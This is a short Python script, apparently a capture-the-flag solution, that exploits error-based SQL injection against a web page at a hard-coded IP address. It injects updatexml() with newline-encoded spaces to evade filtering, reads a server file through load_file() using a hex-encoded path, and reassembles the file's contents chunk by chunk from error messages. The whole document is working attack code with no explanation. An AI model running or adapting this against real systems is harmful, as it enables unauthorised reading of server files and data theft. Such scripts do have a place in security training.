import requests
import re
flag=''
url='http://103.238.227.13:10088/index.php?id=1%0Aand%0A1=(updatexml(1,concat(0x3a,(select%0Asubstr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),2))),1))'
for i in range (0,20):
    newurl='http://103.238.227.13:10088/index.php?id=1%0Aand%0A1=(updatexml(1,concat(0x3a,(select%0Asubstr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),{0}))),1))'.format(1+30*i)
    a=requests.get(newurl)
    b=a.text
    if(re.findall(r'[A-Z0-9]{30}', b)):
        c=re.findall(r'[A-Z0-9]{30}', b)
        print c[0]
        flag+=c[0]
    else:
        print i
        break
print flag
    

